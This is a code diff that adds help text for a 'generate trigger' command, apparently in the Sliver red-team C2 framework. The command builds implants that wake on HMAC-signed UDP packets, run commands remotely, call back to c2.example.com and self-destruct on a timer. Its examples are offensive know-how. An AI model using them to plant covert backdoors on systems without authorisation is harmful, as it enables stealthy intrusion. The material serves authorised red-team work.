@@ -45,8 +45,10 @@ var (
 		consts.BackgroundStr:    backgroundHelp,
 		consts.InfoStr:          infoHelp,
 		consts.UseStr:           useHelp,
-		consts.GenerateStr:      generateHelp,
-		consts.StageListenerStr: stageListenerHelp,
+		consts.GenerateStr:                                  generateHelp,
+		consts.GenerateStr + sep + consts.TriggerStr:        generateTriggerHelp,
+		consts.TriggersStr:                                  triggersHelp,
+		consts.StageListenerStr:                             stageListenerHelp,
 
 		consts.MsfStr:         msfHelp,
 		consts.MsfInjectStr:   msfInjectHelp,
@@ -268,6 +270,77 @@ Due to the large number of options and C2s this can be a lot of typing. If you'd
 see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
 command.
 `
+	generateTriggerHelp = `[[.Bold]]Command:[[.Normal]] generate trigger <options>
+[[.Bold]]About:[[.Normal]] Generate a trigger implant with two operational modes, both always baked in:
+
+  1. [[.Bold]]Ad-hoc exec[[.Normal]] -- bidirectional UDP command execution. Fire a signed "exec" packet;
+     the implant runs the command and returns output over UDP. No C2 session required.
+
+  2. [[.Bold]]Wake session[[.Normal]] -- on receipt of a signed "wake" packet, the implant establishes
+     an interactive SESSION (not a beacon) over its configured C2 transports.
+
+Trigger implants do NOT support beacon mode. Wake always establishes a full interactive session.
+
+[[.Bold]][[.Underline]]++ Transport Options ++[[.Normal]]
+  --mtls    TCP callback (mTLS). Reliable, works through most NAT/firewalls.
+  --wg      UDP callback (WireGuard). Lower overhead, works well for UDP-friendly networks.
+
+For maximum flexibility, specify BOTH transports so the implant can use TCP or UDP for the
+wake callback depending on network conditions:
+	generate trigger --trigger-wake-bind 0.0.0.0:46290 --trigger-wake-secret-env TRIGGER_SECRET \
+		--mtls c2.example.com --wg c2.example.com:9090
+
+[[.Bold]][[.Underline]]++ Basic Usage ++[[.Normal]]
+Generate a trigger implant with TCP callback:
+	generate trigger --trigger-wake-bind 0.0.0.0:46290 --trigger-wake-secret-env TRIGGER_SECRET --mtls c2.example.com
+
+Generate a trigger implant with UDP callback:
+	generate trigger --trigger-wake-bind 0.0.0.0:46290 --trigger-wake-secret-env TRIGGER_SECRET --wg c2.example.com:9090
+
+Generate a trigger implant with both TCP and UDP callbacks (recommended):
+	generate trigger --trigger-wake-bind 0.0.0.0:46290 --trigger-wake-secret-env TRIGGER_SECRET \
+		--mtls c2.example.com --wg c2.example.com:9090
+
+[[.Bold]][[.Underline]]++ Secret Resolution ++[[.Normal]]
+The HMAC secret used to authenticate trigger packets is resolved in this order:
+  1. --trigger-wake-secret-env ENVVAR   Read from an environment variable on the operator host (preferred; no secret in argv).
+  2. --trigger-wake-secret VALUE        Pass the secret directly (visible in ps; use --trigger-wake-secret-env instead).
+  3. Interactive prompt                  If neither flag is set, you are prompted on stdin (masked on TTY).
+
+[[.Bold]][[.Underline]]++ Access Control ++[[.Normal]]
+Restrict which client_ids are allowed to send trigger packets:
+	generate trigger --trigger-wake-bind 0.0.0.0:46290 --trigger-wake-secret-env TRIGGER_SECRET \
+		--trigger-wake-allowed-client ops-alice --trigger-wake-allowed-client ops-bob \
+		--mtls c2.example.com --wg c2.example.com:9090
+
+[[.Bold]][[.Underline]]++ TTL Deadman Switch ++[[.Normal]]
+Combine with --ttl to set a self-destruct deadline:
+	generate trigger --trigger-wake-bind 0.0.0.0:46290 --trigger-wake-secret-env TRIGGER_SECRET \
+		--ttl 720h --ttl-burn-extra-path /tmp/payload --mtls c2.example.com
+
+[[.Bold]][[.Underline]]++ All Generate Flags ++[[.Normal]]
+This subcommand accepts all flags from 'generate' (--os, --arch, --format, --mtls, --wg, --http, etc.).
+Beacon flags (--seconds, --jitter, etc.) are NOT available -- trigger implants always wake into sessions.
+`
+
+	triggersHelp = `[[.Bold]]Command:[[.Normal]] triggers
+[[.Bold]]About:[[.Normal]] List all generated trigger implants (builds with triggerwake enabled).
+
+Displays an indexed table of trigger implants, similar to how 'beacons' lists active beacons.
+The index can be used with 'trigger send <index> <intent>' to fire trigger packets without
+manually specifying the target IP, port, and secret.
+
+[[.Bold]][[.Underline]]++ Subcommands ++[[.Normal]]
+  triggers target <index> <ip>    Associate a target IP with a trigger implant by index.
+                                   The mapping is stored client-side in ~/.sliver-client/triggers.json.
+
+[[.Bold]][[.Underline]]++ Examples ++[[.Normal]]
+  triggers                         List all trigger implants with their index, name, port, etc.
+  triggers target 1 192.168.1.42   Store target IP for trigger at index 1.
+  trigger send 1 wake              Send a wake packet to trigger #1 (uses stored target + build config).
+  trigger send 1 exec --payload "whoami"   Execute a command on trigger #1.
+`
+
 	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
 [[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
 [[.Bold]]Examples:[[.Normal]] 
